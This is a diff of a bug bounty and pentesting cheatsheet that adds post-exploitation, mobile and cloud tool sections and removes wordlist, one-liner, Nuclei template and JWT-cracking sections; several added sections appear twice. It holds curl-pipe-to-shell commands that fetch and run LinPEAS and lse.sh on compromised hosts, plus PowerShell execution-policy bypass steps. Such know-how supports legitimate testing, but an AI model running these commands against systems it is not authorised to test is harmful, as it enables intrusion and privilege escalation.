@@ -1,16 +1,4 @@
-<pre>
-                                                                                 
-  _____                        _     ____  
- (_____)          ____  _     (_)_  (____) 
-(_)___(_)  ____  (____)(_)__  (___)(_)  (_)
-(_______) (____)(_)_(_)(____) (_)  (_)  (_)
-(_)   (_)( )_(_)(__)__ (_) (_)(_)_ (_)__(_)
-(_)   (_) (____) (____)(_) (_) (__) (____) 
-         (_)_(_)                           
-          (___)                                        
-</pre>
-
-# Advanced Bug Bounty & Pentesting Cheatsheet
+# Agent0 - Advanced Bug Bounty & Pentesting Cheatsheet
 
 This repository contains a comprehensive and advanced cheatsheet for bug bounty hunting and penetration testing. It covers the entire process from reconnaissance to reporting, with a focus on advanced techniques, automation, and custom templates to stay ahead of the curve.
 
@@ -45,8 +33,145 @@ This repository contains a comprehensive and advanced cheatsheet for bug bounty 
     *   [3.17 Open Redirection](#317-open-redirection)
     *   [3.18 CORS (Cross-Origin Resource Sharing) Misconfigurations](#318-cors-cross-origin-resource-sharing-misconfigurations)
 5.  [Phase 4: Reporting & Post-Engagement](#phase-4-reporting--post-engagement)
-6.  [Essential Tools Arsenal](#essential-tools-arsenal)
-7.  [Custom Nuclei Templates](#custom-nuclei-templates)
+6.  [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
+    *   [5.1 Linux Enumeration](#51-linux-enumeration)
+    *   [5.2 Windows Enumeration](#52-windows-enumeration)
+7.  [Phase 6: Mobile Application Pentesting (Android & iOS)](#phase-6-mobile-application-pentesting-android--ios)
+    *   [6.1 Setup & Core Tools](#61-setup--core-tools)
+    *   [6.2 Android Specific Tools](#62-android-specific-tools)
+    *   [6.3 iOS Specific Tools](#63-ios-specific-tools)
+8.  [Phase 7: Cloud Security Auditing & Exploitation](#phase-7-cloud-security-auditing--exploitation)
+    *   [7.1 Multi-Cloud Auditing](#71-multi-cloud-auditing)
+    *   [7.2 AWS Exploitation](#72-aws-exploitation)
+    *   [7.3 Azure Exploitation](#73-azure-exploitation)
+9.  [Essential Tools Arsenal](#essential-tools-arsenal)
+10. [Custom Nuclei Templates](#custom-nuclei-templates)
+11. [The Bug Hunter's Methodology (TBHM)](https://www.google.com/search?q=The+Bug+Hunter%27s+Methodology) - A great resource for learning the process.
+
+---
+
+## Phase 7: Cloud Security Auditing & Exploitation
+
+Vulnerabilities are not just in the code, but in the infrastructure that runs it.
+
+### 7.1 Multi-Cloud Auditing
+*   **ScoutSuite:** An open source multi-cloud security-auditing tool.
+    ```bash
+    # Installation
+    pip install scoutsuite
+    # Usage (AWS)
+    scout aws
+    # Usage (Azure)
+    scout azure
+    # Usage (GCP)
+    scout gcp
+    ```
+*   **Prowler:** A command-line tool for AWS security assessment, auditing, hardening, and incident response.
+    ```bash
+    # Installation
+    pip install prowler
+    # Usage
+    prowler aws
+    ```
+
+### 7.2 AWS Exploitation
+*   **Pacu:** The AWS exploitation framework. Think Metasploit, but for AWS.
+    ```bash
+    # Installation
+    git clone https://github.com/RhinoSecurityLabs/pacu.git
+    cd pacu
+    bash install.sh
+    python3 pacu.py
+    ```
+
+### 7.3 Azure Exploitation
+*   **MicroBurst:** A collection of scripts for assessing Azure security.
+    ```bash
+    # Installation
+    git clone https://github.com/NetSPI/MicroBurst.git
+    ```
+
+---
+
+## Phase 6: Mobile Application Pentesting (Android & iOS)
+
+Mobile applications are a huge attack surface. A different set of tools is required compared to web pentesting.
+
+### 6.1 Setup & Core Tools
+*   **Frida:** A dynamic instrumentation toolkit. It lets you inject scripts into black-box processes. Essential for runtime manipulation, bypassing client-side controls, and instrumentation.
+    ```bash
+    # Installation
+    pip install frida-tools
+    # On jailbroken iOS or rooted Android device: run frida-server
+    ```
+*   **Objection:** A runtime mobile exploration toolkit, powered by Frida.
+    ```bash
+    # Installation
+    pip install objection
+    # Usage
+    objection --gadget "com.example.app" explore
+    ```
+*   **MobSF (Mobile Security Framework):** An all-in-one, automated mobile app pentesting framework.
+    ```bash
+    # Installation (Docker)
+    docker pull opensecurity/mobile-security-framework-mobsf
+    docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+    ```
+*   **Configuring Burp Suite:** You must proxy your mobile device's traffic through Burp to analyze API requests. This involves setting the proxy on your device and installing the Burp CA certificate.
+
+### 6.2 Android Specific Tools
+*   **apktool:** For reverse engineering Android APK files.
+    ```bash
+    # Decode an APK
+    apktool d app.apk
+    # Rebuild an APK
+    apktool b app
+    ```
+*   **jadx:** A DEX to Java decompiler. Excellent for reading the application's source code.
+    ```bash
+    # Usage (GUI)
+    jadx-gui app.apk
+    ```
+*   **Drozer:** A comprehensive security and attack framework for Android.
+    ```bash
+    # Drozer allows you to assume the role of an app and interact with the underlying OS.
+    # Find attack surface, content providers, etc.
+    ```
+
+### 6.3 iOS Specific Tools
+*   **checkra1n / unc0ver:** Jailbreaking tools are often a prerequisite for deep iOS testing.
+*   **keychain_dumper:** A tool to dump keychain contents on a jailbroken device.
+*   **Clutch:** A tool for decrypting App Store applications.
+
+---
+
+## Automation & Chaining Tools
+
+Chaining tools together is key to efficient bug hunting. Here is a sample bash script to automate initial recon.
+
+```bash
+#!/bin/bash
+
+domain=$1
+echo "Starting recon on $domain"
+
+# Subdomain enumeration
+echo "[+] Enumerating subdomains..."
+subfinder -d $domain -o subdomains.txt
+assetfinder --subs-only $domain >> subdomains.txt
+amass enum -passive -d $domain >> subdomains.txt
+sort -u subdomains.txt -o all_subdomains.txt
+
+# Probing for live hosts
+echo "[+] Probing for live hosts..."
+cat all_subdomains.txt | httpx -o live_hosts.txt
+
+# Scanning with Nuclei
+echo "[+] Scanning with Nuclei..."
+nuclei -l live_hosts.txt -t /path/to/your/nuclei-templates/ -o nuclei_results.txt
+
+echo "Recon finished. Check the output files."
+```
 
 ---
 
@@ -771,6 +896,134 @@ http:
 
 ---
 
+## Phase 5: Post-Exploitation
+
+Gaining initial access is only the beginning. These tools help with enumerating the compromised system to find privilege escalation vectors.
+
+### 5.1 Linux Enumeration
+*   **LinPeas:** The go-to script for enumerating a Linux host.
+    ```bash
+    # Download and run LinPeas
+    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+    ```
+*   **lse.sh:** Linux Suggester Enumerator, another excellent enumeration script.
+    ```bash
+    # Download and run lse.sh
+    curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh
+    ```
+
+### 5.2 Windows Enumeration
+*   **WinPeas:** The Windows version of the PEASS suite.
+    ```bash
+    # Download from your attacker machine and execute on the target
+    https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+    ```
+*   **PowerUp:** A PowerShell script to check for common Windows privilege escalation vectors.
+    ```bash
+    # Part of the PowerSploit suite
+    # Import and run
+    powershell -ep bypass
+    Import-Module ./PowerUp.ps1
+    Invoke-AllChecks
+    ```
+
+---
+
+## Phase 6: Mobile Application Pentesting (Android & iOS)
+
+Mobile applications are a huge attack surface. A different set of tools is required compared to web pentesting.
+
+### 6.1 Setup & Core Tools
+*   **Frida:** A dynamic instrumentation toolkit. It lets you inject scripts into black-box processes. Essential for runtime manipulation, bypassing client-side controls, and instrumentation.
+    ```bash
+    # Installation
+    pip install frida-tools
+    # On jailbroken iOS or rooted Android device: run frida-server
+    ```
+*   **Objection:** A runtime mobile exploration toolkit, powered by Frida.
+    ```bash
+    # Installation
+    pip install objection
+    # Usage
+    objection --gadget "com.example.app" explore
+    ```
+*   **MobSF (Mobile Security Framework):** An all-in-one, automated mobile app pentesting framework.
+    ```bash
+    # Installation (Docker)
+    docker pull opensecurity/mobile-security-framework-mobsf
+    docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+    ```
+*   **Configuring Burp Suite:** You must proxy your mobile device's traffic through Burp to analyze API requests. This involves setting the proxy on your device and installing the Burp CA certificate.
+
+### 6.2 Android Specific Tools
+*   **apktool:** For reverse engineering Android APK files.
+    ```bash
+    # Decode an APK
+    apktool d app.apk
+    # Rebuild an APK
+    apktool b app
+    ```
+*   **jadx:** A DEX to Java decompiler. Excellent for reading the application's source code.
+    ```bash
+    # Usage (GUI)
+    jadx-gui app.apk
+    ```
+*   **Drozer:** A comprehensive security and attack framework for Android.
+    ```bash
+    # Drozer allows you to assume the role of an app and interact with the underlying OS.
+    # Find attack surface, content providers, etc.
+    ```
+
+### 6.3 iOS Specific Tools
+*   **checkra1n / unc0ver:** Jailbreaking tools are often a prerequisite for deep iOS testing.
+*   **keychain_dumper:** A tool to dump keychain contents on a jailbroken device.
+*   **Clutch:** A tool for decrypting App Store applications.
+
+---
+
+## Phase 7: Cloud Security Auditing & Exploitation
+
+Vulnerabilities are not just in the code, but in the infrastructure that runs it.
+
+### 7.1 Multi-Cloud Auditing
+*   **ScoutSuite:** An open source multi-cloud security-auditing tool.
+    ```bash
+    # Installation
+    pip install scoutsuite
+    # Usage (AWS)
+    scout aws
+    # Usage (Azure)
+    scout azure
+    # Usage (GCP)
+    scout gcp
+    ```
+*   **Prowler:** A command-line tool for AWS security assessment, auditing, hardening, and incident response.
+    ```bash
+    # Installation
+    pip install prowler
+    # Usage
+    prowler aws
+    ```
+
+### 7.2 AWS Exploitation
+*   **Pacu:** The AWS exploitation framework. Think Metasploit, but for AWS.
+    ```bash
+    # Installation
+    git clone https://github.com/RhinoSecurityLabs/pacu.git
+    cd pacu
+    bash install.sh
+    python3 pacu.py
+    ```
+
+### 7.3 Azure Exploitation
+*   **MicroBurst:** A collection of scripts for assessing Azure security.
+    ```bash
+    # Installation
+    git clone https://github.com/NetSPI/MicroBurst.git
+    ```
+
+---
+
 ## Automation & Chaining Tools
 
 Chaining tools together is key to efficient bug hunting. Here is a sample bash script to automate initial recon.
@@ -797,287 +1050,3 @@ echo "[+] Scanning with Nuclei..."
 nuclei -l live_hosts.txt -t /path/to/your/nuclei-templates/ -o nuclei_results.txt
 
 echo "Recon finished. Check the output files."
-```
-
----
-
-## Staying Ahead of the Curve
-
-*   **Follow Security Researchers on Twitter:**
-    *   @taviso
-    *   @jobertabma
-    *   @NahamSec
-    *   @stokfredrik
-    *   @Hacker0x01
-*   **Read Security Blogs & News:**
-    *   [PortSwigger Research](https://portswigger.net/research)
-    *   [HackerOne Hacktivity](https://hackerone.com/hacktivity)
-    *   [The Hacker News](https://thehackernews.com/)
-    *   [Project Zero Blog](https://googleprojectzero.blogspot.com/)
-*   **Attend Conferences (or watch the talks online):**
-    *   DEF CON
-    *   Black Hat
-    *   AppSec EU/USA
-*   [The Bug Hunter's Methodology (TBHM)](https://www.google.com/search?q=The+Bug+Hunter%27s+Methodology) - A great resource for learning the process.
-
----
-
-## Wordlists and Payloads
-
-Having high-quality wordlists for fuzzing, brute-forcing, and content discovery is essential.
-
-*   **General Purpose:**
-    *   [SecLists](https://github.com/danielmiessler/SecLists): The absolute gold standard for security testing wordlists.
-    *   [fuzz.txt](https://github.com/Bo0oM/fuzz.txt): A massive collection of payloads for various vulnerability types.
-    *   [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive list of payloads and bypasses for a huge range of vulnerabilities.
-*   **Specialized Wordlists:**
-    *   [Assetnote's Wordlists](https://wordlists.assetnote.io/): High-quality wordlists for content, discovery, and fuzzing from the pros at Assetnote.
-    *   [fuzz4bounty](https://github.com/0xPugal/fuzz4bounty): A great collection of wordlists specifically curated for bug bounty hunting.
-    *   [IntruderPayloads](https://github.com/1N3/IntruderPayloads): A collection of Burp Suite Intruder payloads for various attack types.
-*   **GraphQL:**
-    *   Use `clairvoyance` to generate target-specific wordlists from a GraphQL schema.
-*   **Prototype Pollution:**
-    *   [Prototype-Pollution-Gadgets](https://github.com/kleiton0x00/Prototype-Pollution-Gadgets): A list of known gadgets for prototype pollution.
-
----
-
-## Bug Bounty One-Liners
-
-Quick, powerful command chains to get results fast.
-
-*   **Full Recon Chain (Subdomains, Live Hosts, Scanning):**
-    ```bash
-    subfinder -d example.com -silent | httpx -silent | nuclei -silent -t /path/to/templates/ -o results.txt
-    ```
-*   **Find JavaScript files and scan for secrets:**
-    ```bash
-    cat domains.txt | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript' | awk '{print $1}' | xargs -I@ bash -c 'python3 secretfinder.py -i @ -o cli'
-    ```
-*   **Crawl for params and test for XSS:**
-    ```bash
-    gau example.com | gf xss | kxss
-    ```
-
----
-
-## Essential Tools Arsenal
-
-A list of must-have tools.
-
-| Tool        | Category                  | Installation                               |
-|-------------|---------------------------|--------------------------------------------|
-| Burp Suite  | Intercepting Proxy        | [Download](https://portswigger.net/burp)   |
-| OWASP ZAP   | Intercepting Proxy        | [Download](https://www.zaproxy.org/)       |
-| Subfinder   | Subdomain Enumeration     | `go install -v ...`                        |
-| httpx       | HTTP Toolkit              | `go install -v ...`                        |
-| Nuclei      | Vulnerability Scanner     | `go install -v ...`                        |
-| ffuf        | Fuzzer                    | `go install -v ...`                        |
-| Nmap        | Port Scanner              | `sudo apt install nmap`                    |
-| SQLMap      | SQLi Scanner              | `sudo apt install sqlmap`                  |
-| Arjun       | Parameter Discovery       | `pip3 install arjun`                       |
-| gowitness   | Visual Recon              | `go install ...`                           |
-| Amass       | Subdomain Enumeration     | `go install -v ...`                        |
-| gitleaks    | Secret Scanner            | `go install ...`                           |
-| trufflehog  | Secret Scanner            | `pip3 install trufflehog`                  |
-| dnsgen      | DNS Permutation           | `pip3 install dnsgen`                      |
-| puredns     | DNS Resolver              | `go install ...`                           |
-| cloud-enum  | Cloud Enumeration         | `pip3 install cloud-enum`                  |
-| gospider    | Web Crawler               | `go install ...`                           |
-| hakrawler   | Web Crawler               | `go install ...`                           |
-| commix      | Command Injection         | `git clone ...`                            |
-| tplmap      | SSTI Scanner              | `git clone ...`                            |
-| Dalfox      | XSS Scanner               | `go install ...`                           |
-| XSStrike    | XSS Scanner               | `git clone ...`                            |
-| kxss        | XSS Scanner               | `go install ...`                           |
-| Ghauri      | SQLi Scanner              | `pip3 install ghauri`                      |
-| SSRFmap     | SSRF Exploitation         | `git clone ...`                            |
-| subjack     | Subdomain Takeover        | `go install ...`                           |
-| clairvoyance| GraphQL Scanner           | `pip3 install clairvoyance`                |
-| Oralyzer    | Open Redirection          | `git clone ...`                            |
-| Corsy       | CORS Scanner              | `git clone ...`                            |
-| smuggler.py | HTTP Request Smuggling    | `git clone ...`                            |
-| ysoserial   | Deserialization Payloads  | `wget ...`                                 |
-| ppmap       | Prototype Pollution       | `go install ...`                           |
-
----
-
-## Custom Nuclei Templates
-
-Here are a few examples of custom Nuclei templates. Create a folder named `custom-templates` and save them there.
-
-### Exposed `.git` Directory
-
-```yaml
-id: exposed-git-directory
-
-info:
-  name: Exposed .git Directory
-  author: YourName
-  severity: high
-  description: The .git directory is publicly accessible.
-  tags: config,exposure
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/.git/config"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "[core]"
-          - "repositoryformatversion"
-        condition: and
-```
-
-### Exposed `.env` File
-
-```yaml
-id: exposed-env-file
-
-info:
-  name: Exposed .env File
-  author: YourName
-  severity: critical
-  description: The .env file is publicly accessible.
-  tags: config,exposure,credentials
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/.env"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "APP_KEY="
-          - "DB_HOST="
-        condition: or
-```
-
-### Subdomain Takeover
-
-```yaml
-id: subdomain-takeover
-
-info:
-  name: Subdomain Takeover
-  author: YourName
-  severity: critical
-  description: A subdomain points to a service (e.g., S3, GitHub Pages) but the resource has been removed.
-  tags: misconfig,takeover
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-
-    matchers:
-      - type: word
-        words:
-          - "The specified bucket does not exist" # S3
-          - "There isn't a GitHub Pages site here." # GitHub Pages
-          - "NoSuchBucket"
-        condition: or
-```
-
-### Security.txt Check
-
-```yaml
-id: security-txt-check
-
-info:
-  name: Security.txt File Check
-  author: YourName
-  severity: info
-  description: Checks for the presence of a security.txt file.
-  tags: discovery,recon
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/.well-known/security.txt"
-      - "{{BaseURL}}/security.txt"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "Contact:"
-          - "Expires:"
-        condition: and
-```
-
-### Apache Server Status Exposure
-
-```yaml
-id: apache-server-status
-
-info:
-  name: Apache Server Status Exposed
-  author: YourName
-  severity: medium
-  description: Apache server-status page is publicly accessible, leaking sensitive information.
-  tags: config,exposure,apache
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/server-status"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "Apache Server Status for"
-          - "Server Uptime"
-        condition: and
-```
-
-### Automated Subdomain Takeover Tools
-*   **subjack:** The classic tool for checking a list of subdomains.
-    ```bash
-    # Installation
-    go install github.com/haccer/subjack@latest
-
-    # Usage
-    subjack -w all_subdomains.txt -t 100 -o takeover_results.txt -c /path/to/fingerprints.json
-    ```
-*   **nuclei:** Nuclei also has powerful templates for takeover detection.
-    ```bash
-    # Run takeover templates specifically
-    nuclei -l all_subdomains.txt -t takeovers/
-    ```
-
-### JWT (JSON Web Token) Vulnerabilities
-
-*   **Automated JWT Scanners:**
-    *   **jwt_tool:** A powerful toolkit for testing, tweaking, and cracking JWTs.
-        ```bash
-        # Installation
-        git clone https://github.com/ticarpi/jwt_tool.git
-        cd jwt_tool
-        python3 -m venv venv
-        source venv/bin/activate
-        pip3 install -r requirements.txt
-
-        # Usage - Check for common misconfigurations
-        python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -M at
-
-        # Crack a weak secret
-        python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -C /path/to/wordlist.txt
-        ``` 
